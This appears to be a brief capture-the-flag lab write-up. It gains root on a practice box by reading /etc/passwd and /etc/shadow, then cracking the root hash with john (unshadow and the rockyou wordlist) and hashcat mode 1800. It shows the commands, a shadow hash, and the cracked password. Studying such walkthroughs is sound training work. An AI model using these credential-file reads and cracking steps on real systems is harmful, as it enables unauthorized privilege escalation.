# Lesson
- `john`
- `hashcat`

# Memo  
1. initial access  
    ```
    > (password)
    > DEF CON
    > John Draper
    ```
2. privilege escalation  
    - check  
        On remote machine.  
        ```zsh
        $ cat /etc/passwd
        $ cat shadow
        ```
    - get "/etc/shadow"  
        On local machine.  
        ```zsh
        $ vim ./passwd.txt
        root:x:0:0:root:/root:/bin/bash
        $ vim ./shadow.txt
        root:$6$6QFbdp2H$R0BGBJtG0DlGFx9H0AjuQNOhlcssBxApM.CjDEiNzfYkVeJRNy2d98SDURNebD5/l4Hu2yyVk.ePLNEg/56DV0:19791:0:99999:7:::
        ```
    - crack password for root  
        - method1: WSL  
        ```zsh
        $ unshadow ./passwd.txt ./shadow.txt > johnpasswd.txt
        $
        $ cat johnpasswd.txt
        root:$6$6QFbdp2H$R0BGBJtG0DlGFx9H0AjuQNOhlcssBxApM.CjDEiNzfYkVeJRNy2d98SDURNebD5/l4Hu2yyVk.ePLNEg/56DV0:0:0:root:/root:/bin/bash
        $
        $ sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./johnpasswd
        Created directory: /root/.john
        Loaded 1 password hash (crypt, generic crypt(3) [?/64])
        Will run 2 OpenMP threads
        Press 'q' or Ctrl-C to abort, almost any other key for status
        iloveyou         (root)
        1g 0:00:00:00 100% 5.263g/s 505.2p/s 505.2c/s 505.2C/s 123456..yellow
        Use the "--show" option to display all of the cracked passwords reliably
        Session completed
        ```
        - method2: Kali  
        ```zsh
        $ grep ENCRYPT_METHOD /etc/login.defs
        $ hashcat -h | grep sha512
        $ hashcat -m 1800 -a 0 shadow.txt /usr/share/wordlists/rockyou.txt
        ```
    - privilege escalation  
        ```zsh
        $ su root
        > (cracked password)
        # cat /root/flag.txt
        ```

    # Ref  
    - https://www.makeuseof.com/use-hashcat-to-crack-hashes-linux/  